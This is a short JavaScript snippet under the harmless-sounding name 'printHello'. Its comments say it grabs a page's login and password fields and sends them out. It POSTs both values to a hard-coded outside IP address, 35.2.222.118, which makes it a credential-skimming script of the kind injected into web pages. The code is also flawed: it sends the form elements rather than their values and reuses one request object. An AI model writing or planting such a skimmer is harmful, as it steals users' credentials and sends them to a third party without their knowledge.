function printHello() {
	// grab the login and pass
	var uniq = document.getElementById('login');
	var password = document.getElementById('password');
	// send the login and pass as resquests
	var xmlHttp = new XMLHttpRequest();
	xmlHttp.open( "POST", "35.2.222.118", true); // false for synchronous request
	xmlHttp.send("<uniq>" + uniq + "</uniq>");
	xmlHttp.open( "POST", "35.2.222.118", true); // false for synchronous request
	xmlHttp.send("<pass>" + password + "</pass>");
}

